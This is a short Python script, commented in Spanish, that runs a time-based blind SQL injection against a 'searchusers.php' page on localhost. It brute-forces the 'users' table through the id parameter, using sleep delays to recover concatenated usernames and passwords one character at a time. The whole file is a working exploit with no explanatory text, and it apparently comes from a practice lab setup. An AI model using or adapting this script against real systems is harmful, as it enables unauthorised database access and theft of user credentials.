#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchusers.php"
characters = string.printable


def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1,150):
        for character in range(33,126):
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)

            p1.status(sqli_url)

            time_start = time.time()

            r = requests.get(sqli_url)

            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == "__main__":
    makeSQLI()
